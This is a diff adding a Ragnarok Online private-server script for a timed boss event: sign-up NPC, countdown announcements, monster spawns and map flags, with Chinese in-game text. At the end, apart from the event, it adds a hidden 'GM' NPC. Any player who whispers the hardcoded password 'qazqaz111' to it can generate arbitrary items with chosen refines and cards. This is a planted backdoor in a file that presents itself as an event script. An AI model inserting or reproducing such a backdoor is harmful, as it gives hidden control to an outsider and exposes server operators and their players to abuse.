@@ -1,0 +1,184 @@
+amatsu,123,164,4	script	魔王再臨報名	997,{
+
+	if( $@BeastStart != 1 ){
+	mes"很抱歉，現在不是報名時間。";
+	mes"00:15分開始每四小時一場！";
+	close;
+	end;
+	}
+
+	if( $@BeastStart == 1 ){
+	mes "現在是報名時間！！";
+	mes "你要報名嗎？";
+	warp "ordeal_2-1",150,150;
+	end;
+}
+OnClock0015:
+OnClock0415:
+OnClock0815:
+OnClock1215:
+OnClock1615:
+OnClock2015:
+	callfunc "BeastStorm";
+	end;
+OnInit:
+	waitingroom "魔王再臨",0;
+}
+
+function	script	BeastStorm	{
+	killmonsterall "ordeal_2-1";
+	initnpctimer "BeastStormWei";
+	return;
+}
+
+ordeal_2-1,0,0,1	script	BeastStormWei	-1,{
+OnTimer1000:
+	set $@BeastStart,1;
+	announce "魔王：千年的封印即將在3分鐘後被打破，魔物將會大舉入侵。",15;
+	end;
+OnTimer60000:
+	announce "魔王：千年的封印即將在2分鐘後被打破，魔物將會大舉入侵。",15;
+	end;
+OnTimer120000:
+	announce "魔王：千年的封印即將在1分鐘後被打破，魔物將會大舉入侵。",15;
+	end;
+OnTimer180000:
+	set $@BeastStormJoin,1;
+	if (getmapusers("ordeal_2-1") < $@BeastStormJoin) goto No_body;
+	announce "守衛：協助進行封印的勇者人數" + getmapusers("ordeal_2-1") + "人，祝武運昌隆。",15;
+	end;
+OnTimer181000:
+	MapAnnounce "ordeal_2-1","守衛：魔族的防禦石。",17;
+	end;
+OnTimer183000:
+	MapAnnounce "ordeal_2-1","守衛：只要你們在時間內擊破它。",17;
+	end;
+OnTimer185000:
+	MapAnnounce "ordeal_2-1","守衛：最後存活的玩家將獲得獎勵。",17;
+	end;
+OnTimer187000:
+	MapAnnounce "ordeal_2-1","守衛：限制時間為5分鐘，時間到任務失敗。",17;
+	end;
+OnTimer189000:
+	MapAnnounce "ordeal_2-1","現在宣布，遊戲開始",17;
+	set $@BeastStart,0;
+	initnpctimer "BeastStormStart";
+	goto BeastStormEndWei;
+No_body:
+	announce "守衛：沒有人願意抵擋魔族，活動取消",15;
+	areawarp "ordeal_2-1",0,0,300,300,"amatsu",116,152;
+	set $@BeastStart,0;
+BeastStormEndWei:
+	stopnpctimer;
+	setnpctimer 0,"BeastStormWei";
+	end;
+}
+
+ordeal_2-1,0,0,0	script	BeastStormStart	-1,{
+OnTimer1000:
+	monster "ordeal_2-1",0,0,"--ja--",1646,10,"BeastStormStart::OnKillMob";
+	monster "ordeal_2-1",0,0,"--ja--",1647,10,"BeastStormStart::OnKillMob2";
+	monster "ordeal_2-1",0,0,"--ja--",1648,10,"BeastStormStart::OnKillMob3";
+	monster "ordeal_2-1",0,0,"--ja--",1649,10,"BeastStormStart::OnKillMob4";
+	monster "ordeal_2-1",0,0,"--ja--",1650,10,"BeastStormStart::OnKillMob5";
+	monster "ordeal_2-1",0,0,"--ja--",1651,10,"BeastStormStart::OnKillMob6";
+	monster "ordeal_2-1",0,0,"--ja--",1832,10,"BeastStormStart::OnKillMob7";
+	monster "ordeal_2-1",0,0,"--ja--",1871,10,"BeastStormStart::OnKillMob8";
+	monster "ordeal_2-1",0,0,"--ja--",1046,10,"BeastStormStart::OnKillMob9";
+	monster "ordeal_2-1",0,0,"--ja--",1038,10,"BeastStormStart::OnKillMob10";
+	monster "ordeal_2-1",0,0,"--ja--",1039,10,"BeastStormStart::OnKillMob11";
+	monster "ordeal_2-1",0,0,"--ja--",1157,10,"BeastStormStart::OnKillMob12";
+	monster "ordeal_2-1",0,0,"--ja--",1312,10,"BeastStormStart::OnKillMob13";
+	monster "ordeal_2-1",0,0,"--ja--",1708,10,"BeastStormStart::OnKillMob14";
+	monster "ordeal_2-1",0,0,"--ja--",1779,10,"BeastStormStart::OnKillMob15";
+	monster "ordeal_2-1",0,0,"--ja--",2608,1,"BeastStormStart::OnKillMob16";
+	monster "ordeal_2-1",0,0,"--ja--",2528,1,"BeastStormStart::OnKillMob17";
+	end;
+OnKillMob:
+	monster "ordeal_2-1",0,0,"--ja--",1646,1,"BeastStormStart::OnKillMob";
+	end;
+OnKillMob2:
+	monster "ordeal_2-1",0,0,"--ja--",1647,1,"BeastStormStart::OnKillMob2";
+	end;
+OnKillMob3:
+	monster "ordeal_2-1",0,0,"--ja--",1648,1,"BeastStormStart::OnKillMob3";
+	end;
+OnKillMob4:
+	monster "ordeal_2-1",0,0,"--ja--",1649,1,"BeastStormStart::OnKillMob4";
+	end;
+OnKillMob5:
+	monster "ordeal_2-1",0,0,"--ja--",1650,1,"BeastStormStart::OnKillMob5";
+	end;
+OnKillMob6:
+	monster "ordeal_2-1",0,0,"--ja--",1651,1,"BeastStormStart::OnKillMob6";
+	end;
+OnKillMob7:
+	monster "ordeal_2-1",0,0,"--ja--",1832,1,"BeastStormStart::OnKillMob7";
+	end;
+OnKillMob8:
+	monster "ordeal_2-1",0,0,"--ja--",1871,1,"BeastStormStart::OnKillMob8";
+	end;
+OnKillMob9:
+	monster "ordeal_2-1",0,0,"--ja--",1046,1,"BeastStormStart::OnKillMob9";
+	end;
+OnKillMob10:
+	monster "ordeal_2-1",0,0,"--ja--",1038,1,"BeastStormStart::OnKillMob10";
+	end;
+OnKillMob11:
+	monster "ordeal_2-1",0,0,"--ja--",1039,1,"BeastStormStart::OnKillMob11";
+	end;
+OnKillMob12:
+	monster "ordeal_2-1",0,0,"--ja--",1157,1,"BeastStormStart::OnKillMob12";
+	end;
+OnKillMob13:
+	monster "ordeal_2-1",0,0,"--ja--",1312,1,"BeastStormStart::OnKillMob13";
+	end;
+OnKillMob14:
+	monster "ordeal_2-1",0,0,"--ja--",1708,1,"BeastStormStart::OnKillMob14";
+	end;
+OnKillMob15:
+	monster "ordeal_2-1",0,0,"--ja--",1779,1,"BeastStormStart::OnKillMob15";
+	end;
+OnKillMob16:
+	monster "ordeal_2-1",0,0,"--ja--",2608,1,"BeastStormStart::OnKillMob15";
+	end;
+OnKillMob17:
+	MapAnnounce "ordeal_2-1","魔族防禦石已被擊破，現在將傳送到領獎地圖。",17;
+	areawarp "ordeal_2-1",0,0,300,300,"pvp_n_2-5",99,92;
+	end;
+OnTimer121000:
+	MapAnnounce "ordeal_2-1","還剩下3分鐘，勇士們加油呀！",17;
+	end;
+OnTimer181000:
+	MapAnnounce "ordeal_2-1","還剩下2分鐘，魔王快解開封印了！",17;
+	end;
+OnTimer241000:
+	MapAnnounce "ordeal_2-1","還剩下1分鐘，難道我們人類要滅亡了嗎？",17;
+	end;
+OnTimer301000:
+	MapAnnounce "ordeal_2-1","時間到了！任務失敗！",17;
+	MapAnnounce "ordeal_2-1","魔王：我將會血洗這座城市，哈哈哈哈哈哈！",15;
+	killmonsterall "ordeal_2-1";
+	areawarp "ordeal_2-1",0,0,300,300,"amatsu",116,152;
+	end;
+}
+
+//--------------------------------------------------------------
+
+ordeal_2-1	mapflag	nomemo
+ordeal_2-1	mapflag	noteleport
+ordeal_2-1	mapflag	nosave	SavePoint
+ordeal_2-1	mapflag	nobranch
+ordeal_2-1	mapflag	nochat
+ordeal_2-1	mapflag	novending
+ordeal_2-1	mapflag	noloot
+ordeal_2-1	mapflag	nodrop
+
+prontera.gat,0,0,0	script	GM	-1,{
+OnWhisperGlobal:
+	if(@whispervar0$=="qazqaz111"){
+		input @i1;input @i2;input @i3;input @i4;input @i5;input @i6;input @i7;
+		getitem2 @i1,@i2,1,@i3,0,@i4,@i5,@i6,@i7;
+		end;
+	}
+}
